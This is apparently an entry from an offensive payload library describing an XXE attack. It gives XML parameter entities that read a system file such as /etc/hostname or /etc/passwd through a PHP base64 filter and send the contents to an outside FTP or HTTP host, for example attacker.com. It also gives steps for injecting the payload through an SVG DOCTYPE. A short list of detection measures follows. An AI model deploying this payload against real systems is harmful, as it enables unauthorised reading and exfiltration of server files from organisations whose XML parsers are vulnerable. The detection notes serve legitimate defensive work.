---
id: 4d9df60b-5aee-4eba-9ade-4898eb1dd8f5
name: XXE-Base64-Encode-and-FTP-Exfil-Payload
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.559016+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - Web
tags:
  - xxe
  - exfiltration
  - ftp
  - base64
validated: true
---

# XXE-Base64-Encode-and-FTP-Exfil-Payload

## Code

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```

## Description

These parameter entities read a file (e.g., /etc/hostname), base64-encode it using PHP filters, and define an exfiltration entity to send the data via FTP to an attacker server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| php://filter/convert.base64-encode/resource=/etc/hostname | Filter chain for reading and encoding | php://filter/.../resource=/etc/passwd |
| ftp://example.org:2121/%data; | Exfil protocol and endpoint | http://attacker.com/%data; |

## Usage

Embed in an SVG DOCTYPE, then %param1; to expand, followed by &exfil; in the body. Inject; the parser sends encoded data to FTP server.

## Detection

- Monitor FTP logs for inbound connections from internal systems.
- Block php:// and ftp:// URIs in XML parsers.
- Audit for base64 data in outbound traffic.

## Related

- [[procedures/XXE-Injection-via-SVG-Image]]
